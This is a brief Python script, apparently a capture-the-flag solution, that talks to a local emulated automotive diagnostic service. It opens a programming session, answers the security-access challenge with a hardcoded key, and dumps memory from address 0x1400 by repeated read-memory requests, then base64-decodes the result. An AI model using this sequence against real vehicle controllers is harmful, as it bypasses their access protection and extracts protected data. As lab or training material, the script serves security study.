import socket
import os
import base64

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('127.0.0.1', 11231))

sock.recv(8)
sock.send(bytes([0x30] + [0] * 7))
for i in range(10):
	sock.recv(8)
	
	
sock.send(bytes([0x02, 0x10, 0x02] + [0] * 5))
sock.recv(8)
sock.send(bytes([0x02, 0x27, 0x01] + [0] * 5))
sock.recv(8)
sock.send(bytes([0x06, 0x27, 0x02, 0x00, 0x00, 0x00, 0x85] + [0] * 1))
sock.recv(8)


data = ''
addr = 0x1400
for i in range(22):
	sock.send(bytes([0x05, 0x23, 0x21, addr//0x100, addr%0x100, 0x06] + [0] * 2))
	data += sock.recv(8)[2:].decode()
	addr += 6
print(base64.b64decode(data))
	
